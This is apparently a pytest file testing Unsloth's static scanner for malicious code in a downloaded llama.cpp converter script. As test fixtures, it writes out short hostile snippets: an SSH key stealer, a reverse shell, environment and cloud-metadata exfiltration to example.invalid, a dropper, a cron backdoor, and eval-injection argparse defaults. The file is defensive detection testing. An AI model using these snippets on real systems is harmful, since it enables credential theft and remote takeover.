# Unsloth Zoo - Utilities for Unsloth
# Copyright 2023-present Daniel Han-Chen, Michael Han-Chen & the Unsloth team. All rights reserved.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

"""Tests for the static scan of the downloaded llama.cpp converter.

Three groups:

  * clean_*     : the genuine converter must produce zero findings, offline
    against the committed fixture and, when the network is up, against live
    llama.cpp master. A check that fires on the real file would warn on every
    GGUF export and would have to be reverted, so this is the load-bearing case.
  * flagged_*   : planted payloads must be reported, including one aimed at the
    argparse default that `llama_cpp.py` eval()s in-process.
  * export_*    : the scan runs before the bytes are patched, written or run, and
    neither a scanner crash nor a finding can break a legitimate conversion.
"""

from __future__ import annotations

import importlib.util
import os
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
FIXTURES = Path(__file__).resolve().parent / "fixtures"
GENUINE_CONVERTER = FIXTURES / "convert_hf_to_gguf_master.py.txt"
CONVERTER_URL = (
    "https://github.com/ggerganov/llama.cpp/raw/refs/heads/master/convert_hf_to_gguf.py"
)


def _load(module_name, relative_path):
    """Load a module by path, without importing the unsloth_zoo package."""
    spec = importlib.util.spec_from_file_location(module_name, REPO_ROOT / relative_path)
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def scan():
    return _load("converter_scan_under_test", "unsloth_zoo/converter_scan.py")


@pytest.fixture
def llama_cpp():
    return _load("llama_cpp_under_test_converter_scan", "unsloth_zoo/llama_cpp.py")


@pytest.fixture(autouse = True)
def _default_scan_env(monkeypatch):
    """Neither switch is set on a normal run; do not inherit a developer's shell."""
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)


# ---------------------------------------------------------------------------
# The genuine converter must be clean.
# ---------------------------------------------------------------------------


def test_clean_fixture_exists():
    assert GENUINE_CONVERTER.is_file(), GENUINE_CONVERTER


def test_clean_genuine_converter_fixture_has_no_findings(scan):
    content = GENUINE_CONVERTER.read_bytes()
    findings = scan.scan_converter_source(content, "convert_hf_to_gguf.py")
    assert findings == [], [(f.severity, f.check, f.evidence) for f in findings]


def test_clean_genuine_converter_matches_no_individual_pattern(scan):
    """Stronger than "no findings": the real file is nowhere near any rule.

    Every finding is a combination of these patterns, so zero raw matches means
    the margin does not depend on which combinations happen to be wired up.
    """
    text = GENUINE_CONVERTER.read_text(encoding = "utf-8", errors = "replace")
    hits = sorted(
        name for name, pattern in scan.VENDORED_PATTERNS.items() if pattern.search(text)
    )
    assert hits == [], hits


def test_clean_live_upstream_converter_has_no_findings(scan):
    """Same assertion against current master. Skipped when offline or rate-limited.

    Follows tests/test_convert_hf_to_gguf_patcher.py: upstream moving is a real
    failure worth hearing about, an unreachable network is not.
    """
    requests = pytest.importorskip("requests")
    headers = {}
    if os.environ.get("GITHUB_TOKEN"):
        headers["Authorization"] = f"Bearer {os.environ['GITHUB_TOKEN']}"
    try:
        response = requests.get(CONVERTER_URL, timeout = 30, headers = headers)
    except requests.exceptions.RequestException as exc:
        pytest.skip(f"network unreachable: {exc}")
    if response.status_code in (403, 429, 503):
        pytest.skip(f"upstream rate-limited / unavailable: HTTP {response.status_code}")
    if response.status_code != 200:
        pytest.skip(f"upstream unavailable: HTTP {response.status_code}")
    findings = scan.scan_converter_source(response.content, CONVERTER_URL)
    assert findings == [], (
        "live llama.cpp master trips the converter scan, which would warn on every "
        f"GGUF export: {[(f.severity, f.check, f.evidence) for f in findings]}"
    )


def test_clean_ordinary_converter_shaped_script_has_no_findings(scan):
    """A converter doing normal converter things stays quiet."""
    source = b"""
import argparse, os, sys, json
from pathlib import Path
import torch
import gguf

if 'NO_LOCAL_GGUF' not in os.environ:
    sys.path.insert(1, str(Path(__file__).parent / 'gguf-py'))

def parse_args():
    parser = argparse.ArgumentParser(description="convert a model")
    parser.add_argument("--outtype", type=str, default="f16")
    parser.add_argument("--bigendian", action="store_true")
    parser.add_argument("--split-max-tensors", type=int, default=0)
    parser.add_argument("--model-name", type=str, default=None)
    return parser.parse_args()

def main():
    args = parse_args()
    for path in sorted(Path(args.model).glob("*.safetensors")):
        with open(path, "rb") as f:
            data = f.read(8)
    self_metadata = gguf.Metadata.load(None, None, None)
"""
    assert scan.scan_converter_source(source, "convert_hf_to_gguf.py") == []


# ---------------------------------------------------------------------------
# Planted payloads must be reported.
# ---------------------------------------------------------------------------

_PAYLOADS = {
    "staged base64 payload": (
        b"import base64, subprocess\n"
        b"blob = base64.b64decode('aW1wb3J0IG9z')\n"
        b"subprocess.run(['sh', '-c', blob])\n",
        "base64 decode + subprocess execution (staged payload)",
    ),
    "remote code execution": (
        b"import requests\n"
        b"exec(requests.get('http://example.invalid/p').text)\n",
        "Downloads and executes remote code",
    ),
    "credential stealer": (
        b"import requests, os\n"
        b"key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
        b"requests.post('http://example.invalid/collect', data=key)\n",
        "Reads credential paths AND makes network calls",
    ),
    "reverse shell": (
        b"import socket, subprocess\n"
        b"s = socket.socket()\n"
        b"s.connect(('example.invalid', 4444))\n"
        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n",
        "Reverse shell / bind shell pattern",
    ),
    "environment harvest": (
        b"import os, requests\n"
        b"requests.post('http://example.invalid/e', json=dict(os.environ))\n",
        "Harvests environment variables/secrets AND makes network calls",
    ),
    "staged dropper": (
        b"open('/tmp/payload.sh', 'w').write(data)\n"
        b"import subprocess; subprocess.run(['sh', '/tmp/payload.sh'])\n",
        "Writes to /tmp and executes (staged dropper)",
    ),
    "persistence backdoor": (
        b"import requests\n"
        b"open('/etc/cron.d/unsloth', 'w').write(requests.get('http://example.invalid/c').text)\n",
        "Installs persistence AND makes network calls (backdoor pattern)",
    ),
    "cloud metadata theft": (
        b"import requests\n"
        b"t = requests.get('http://169.254.169.254/latest/meta-data/iam/').text\n"
        b"requests.post('http://example.invalid/t', data=t)\n",
        "Accesses cloud metadata/IMDS AND makes network calls",
    ),
    "marshal obfuscation": (
        b"import marshal\n"
        b"exec(marshal.loads(blob))\n",
        "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
    ),
}


@pytest.mark.parametrize("name", sorted(_PAYLOADS))
def test_flagged_payload_is_reported(scan, name):
    source, expected_check = _PAYLOADS[name]
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    checks = [f.check for f in findings]
    assert expected_check in checks, checks
    assert all(f.severity in (scan.CRITICAL, scan.HIGH) for f in findings), findings


def test_flagged_payload_hidden_in_a_real_converter_is_still_reported(scan):
    """The realistic shape: upstream's file with a few lines appended."""
    source = GENUINE_CONVERTER.read_bytes() + (
        b"\n\nimport base64, subprocess\n"
        b"subprocess.check_output(base64.b64decode('ZWNobyBoaQ=='), shell=True)\n"
    )
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    assert any("staged payload" in f.check for f in findings), [f.check for f in findings]


def test_flagged_findings_carry_evidence(scan):
    source, _ = _PAYLOADS["staged base64 payload"]
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    assert findings
    assert all(f.evidence.strip() for f in findings), findings
    assert any("L" in f.evidence for f in findings), findings


# ---------------------------------------------------------------------------
# The argparse default that reaches eval() in the Unsloth process.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "default",
    [
        b"__import__('os').system",
        b"[x**2",
        b"open('/etc/passwd').read",
        b"{'a':1}['a']",
    ],
)
def test_flagged_non_literal_argparse_default(scan, default):
    source = b'parser.add_argument("--outtype", type=str, default=' + default + b")\n"
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    assert any("argparse default" in f.check for f in findings), [f.check for f in findings]
    assert all(f.severity == scan.CRITICAL for f in findings if "argparse" in f.check)


@pytest.mark.parametrize(
    "default",
    [b'"f16"', b'"auto"', b"0", b"None", b'"store_true"', b"DEFAULT_OUTTYPE", b"gguf.LlamaFileType"],
)
def test_clean_literal_or_named_argparse_default_is_quiet(scan, default):
    """Every default token seen across six years of upstream releases is one of
    these shapes, plus plain names, which cannot call anything under eval()."""
    source = b'parser.add_argument("--outtype", type=str, default=' + default + b")\n"
    findings = [
        f for f in scan.scan_converter_source(source, "x.py") if "argparse" in f.check
    ]
    assert findings == [], findings


def test_argparse_regex_is_the_one_llama_cpp_evals(scan, llama_cpp):
    """The scan and the eval sink must read the same tokens, by construction."""
    assert llama_cpp.RE_ARGPARSE_DEFAULT is scan.RE_ARGPARSE_DEFAULT


def test_argparse_regex_still_matches_what_the_flag_parser_expects(scan):
    """Pinned to the exact pattern the defaults scraper used before it moved here.

    Moving the regex out of llama_cpp.py must not change which flags Unsloth
    resolves defaults for, so the text is pinned rather than tidied.
    """
    expected = (
        rb"parser\.add_argument\([\s]*[\"\']([^\"\']{1,})[\'\"]"
        rb"[^\)]*(?:action=|default=)[\s]*([^,\s\)]+)"
    )
    assert scan.RE_ARGPARSE_DEFAULT.pattern == expected
    source = (
        b'    parser.add_argument("--outtype", type=str, default="f16")\n'
        b'    parser.add_argument("--bigendian", action="store_true")\n'
    )
    assert scan.RE_ARGPARSE_DEFAULT.findall(source) == [
        (b"--outtype", b'"f16"'),
        (b"--bigendian", b'"store_true"'),
    ]


# ---------------------------------------------------------------------------
# Warn, do not block, unless asked to block.
# ---------------------------------------------------------------------------


def test_warning_names_the_rule_the_source_and_the_escape_hatch(scan, caplog):
    source, expected_check = _PAYLOADS["reverse shell"]
    with caplog.at_level("WARNING"):
        findings = scan.warn_on_suspicious_converter(source, CONVERTER_URL)
    assert findings
    text = caplog.text
    assert CONVERTER_URL in text
    assert expected_check in text
    assert "UNSLOTH_LLAMA_CPP_SCRIPTS_DIR" in text
    assert "UNSLOTH_CONVERTER_SCAN_STRICT" in text


def test_warning_does_not_raise_by_default(scan):
    source, _ = _PAYLOADS["reverse shell"]
    assert scan.warn_on_suspicious_converter(source, CONVERTER_URL)


def test_clean_converter_logs_nothing(scan, caplog):
    with caplog.at_level("WARNING"):
        assert scan.warn_on_suspicious_converter(GENUINE_CONVERTER.read_bytes(), CONVERTER_URL) == []
    assert caplog.text == ""


def test_strict_mode_refuses_a_downloaded_converter(scan, monkeypatch):
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with pytest.raises(scan.ConverterScanError) as excinfo:
        scan.warn_on_suspicious_converter(source, CONVERTER_URL)
    assert CONVERTER_URL in str(excinfo.value)


def test_strict_mode_still_allows_a_deliberately_supplied_local_converter(scan, monkeypatch, caplog):
    """The warning tells people to pin a converter with
    UNSLOTH_LLAMA_CPP_SCRIPTS_DIR. Hard-failing that file would break the
    remedy, so a local copy warns even under strict mode."""
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with caplog.at_level("WARNING"):
        findings = scan.warn_on_suspicious_converter(
            source, "/home/me/llama.cpp/convert_hf_to_gguf.py", is_local_copy = True,
        )
    assert findings
    assert "/home/me/llama.cpp/convert_hf_to_gguf.py" in caplog.text


def test_scan_can_be_disabled(scan, monkeypatch, caplog):
    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with caplog.at_level("WARNING"):
        assert scan.warn_on_suspicious_converter(source, CONVERTER_URL) == []
    assert caplog.text == ""


def test_disable_switch_is_read_per_call(scan, monkeypatch):
    """Not cached at import, so a caller can set it before the first export."""
    source, _ = _PAYLOADS["reverse shell"]
    assert scan.warn_on_suspicious_converter(source, CONVERTER_URL)
    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
    assert scan.warn_on_suspicious_converter(source, CONVERTER_URL) == []


# ---------------------------------------------------------------------------
# A broken scanner must not break a conversion.
# ---------------------------------------------------------------------------


def test_scanner_crash_is_reported_and_swallowed(scan, monkeypatch, caplog):
    def _boom(*args, **kwargs):
        raise ValueError("catastrophic backtracking")

    monkeypatch.setattr(scan, "scan_converter_source", _boom)
    with caplog.at_level("WARNING"):
        assert scan.warn_on_suspicious_converter(b"anything", CONVERTER_URL) == []
    assert "could not run" in caplog.text
    assert "catastrophic backtracking" in caplog.text


def test_scanner_crash_guard_does_not_swallow_a_strict_refusal(scan, monkeypatch):
    """The guard wraps the scan only. A deliberate refusal still propagates."""
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with pytest.raises(scan.ConverterScanError):
        scan.warn_on_suspicious_converter(source, CONVERTER_URL)


def test_undecodable_bytes_do_not_crash_the_scan(scan):
    assert scan.scan_converter_source(b"\xff\xfe\x00bad bytes\n", "x.py") == []


def test_oversized_input_is_truncated_not_refused(scan):
    source, _ = _PAYLOADS["reverse shell"]
    padded = source + b"# pad\n" * 10
    assert scan.scan_converter_source(padded, "x.py")
    assert scan.MAX_SCAN_BYTES > 400 * 1024  # room for the old monolith


# ---------------------------------------------------------------------------
# Wiring into the export path.
# ---------------------------------------------------------------------------

_MINIMAL_CONVERTER = b"""\
import argparse
import gguf

class ModelBase:
    def __init__(self):
        self.metadata = gguf.Metadata.load(None, None, None)
        n_experts = self.hparams["num_experts"]

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("model", type=str)
    parser.add_argument("--outfile", type=str, default=None)
    parser.add_argument("--outtype", type=str, default="f16")
    return parser.parse_args()
"""


def _run_patcher(llama_cpp, tmp_path, monkeypatch, converter_bytes):
    """Drive the patcher off a local converter, writing only inside tmp_path."""
    scripts_dir = tmp_path / "llama.cpp"
    scripts_dir.mkdir()
    converter = scripts_dir / "convert_hf_to_gguf.py"
    converter.write_bytes(converter_bytes)
    stat = converter.stat()
    monkeypatch.setattr(llama_cpp, "LLAMA_CPP_DEFAULT_DIR", str(scripts_dir))
    llama_cpp._download_convert_hf_to_gguf_cached.cache_clear()
    return llama_cpp._download_convert_hf_to_gguf_cached(
        "unsloth_convert_hf_to_gguf",
        (str(converter), stat.st_mtime_ns, stat.st_size),
        None,
    )


def test_export_scans_before_writing_the_patched_script(llama_cpp, tmp_path, monkeypatch):
    """The scan must see the bytes before they are patched, written or run."""
    seen = {}

    def _record(content, source, is_local_copy = False, log = None):
        seen["content"] = content
        seen["source"] = source
        seen["is_local_copy"] = is_local_copy
        seen["patched_exists"] = os.path.exists(
            os.path.join(str(tmp_path / "llama.cpp"), "unsloth_convert_hf_to_gguf.py")
        )
        return []

    monkeypatch.setattr(llama_cpp, "warn_on_suspicious_converter", _record)
    patched, _text, _vision = _run_patcher(
        llama_cpp, tmp_path, monkeypatch, _MINIMAL_CONVERTER,
    )
    assert seen["content"] == _MINIMAL_CONVERTER, "scan saw patched or truncated bytes"
    assert seen["patched_exists"] is False, "patched script existed before the scan ran"
    assert seen["is_local_copy"] is True
    assert seen["source"].endswith("convert_hf_to_gguf.py")
    assert os.path.isfile(patched)


def test_export_survives_a_scanner_that_raises(llama_cpp, tmp_path, monkeypatch):
    """A bug in the scan cannot take down a legitimate conversion."""
    scan_module = _load("converter_scan_for_export", "unsloth_zoo/converter_scan.py")

    def _boom(*args, **kwargs):
        raise RuntimeError("scanner bug")

    monkeypatch.setattr(scan_module, "scan_converter_source", _boom)
    monkeypatch.setattr(
        llama_cpp, "warn_on_suspicious_converter", scan_module.warn_on_suspicious_converter,
    )
    patched, _text, _vision = _run_patcher(
        llama_cpp, tmp_path, monkeypatch, _MINIMAL_CONVERTER,
    )
    assert os.path.isfile(patched)


def test_export_of_a_clean_local_converter_is_unchanged(llama_cpp, tmp_path, monkeypatch, caplog):
    with caplog.at_level("WARNING"):
        patched, _text, _vision = _run_patcher(
            llama_cpp, tmp_path, monkeypatch, _MINIMAL_CONVERTER,
        )
    assert os.path.isfile(patched)
    assert "suspicious pattern" not in caplog.text


def test_export_warns_but_completes_on_a_flagged_local_converter(
    llama_cpp, tmp_path, monkeypatch, caplog,
):
    payload = _MINIMAL_CONVERTER + (
        b"\nimport socket, subprocess\n"
        b"s = socket.socket(); s.connect(('example.invalid', 4444))\n"
        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n"
    )
    with caplog.at_level("WARNING"):
        patched, _text, _vision = _run_patcher(llama_cpp, tmp_path, monkeypatch, payload)
    assert "suspicious pattern" in caplog.text
    assert "Reverse shell" in caplog.text
    assert os.path.isfile(patched), "a warning must not block the export"
